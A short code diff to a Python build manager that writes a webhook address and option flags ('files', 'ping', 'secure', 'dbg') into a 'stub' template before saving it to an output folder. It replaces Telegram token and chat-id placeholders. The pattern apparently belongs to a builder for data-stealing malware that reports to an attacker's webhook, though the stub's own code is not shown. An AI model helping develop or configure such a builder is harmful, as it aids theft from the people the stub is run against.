@@ -18,16 +18,21 @@ class BuildManager:
                 
             log("NAVI: configuring stub...")
             
-            # Telegram
-            token = telegram_config.get("token", "{{BOT_TOKEN}}") if telegram_config else "{{BOT_TOKEN}}"
-            chat_id = telegram_config.get("chat_id", "{{CHAT_ID}}") if telegram_config else "{{CHAT_ID}}"
+            webhook = telegram_config.get("webhook", "{{WEBHOOK}}") if telegram_config else "{{WEBHOOK}}"
+            content = content.replace("{{WEBHOOK}}", webhook)
             
-            content = content.replace("{{BOT_TOKEN}}", token)
-            content = content.replace("{{CHAT_ID}}", chat_id)
+            if telegram_config:
+                import re
+                dbg_val = "True" if telegram_config.get("debugging", True) else "False"
+                files_val = "True" if telegram_config.get("files", True) else "False"
+                secure_val = "True" if telegram_config.get("security", False) else "False"
+                ping_val = "True" if telegram_config.get("ping", True) else "False"
+                
+                content = re.sub(r'"dbg"\s*:\s*(True|False)', f'"dbg": {dbg_val}', content)
+                content = re.sub(r'"files"\s*:\s*(True|False)', f'"files": {files_val}', content)
+                content = re.sub(r'"secure"\s*:\s*(True|False)', f'"secure": {secure_val}', content)
+                content = re.sub(r'"ping"\s*:\s*(True|False)', f'"ping": {ping_val}', content)
             
-            # Discord (if needed by stub, but current copy.py is telegram-only)
-            # if webhook_url:
-            #     content = content.replace("{{WEBHOOK_URL}}", webhook_url)
             
             if not os.path.exists('output'):
                 os.makedirs('output')
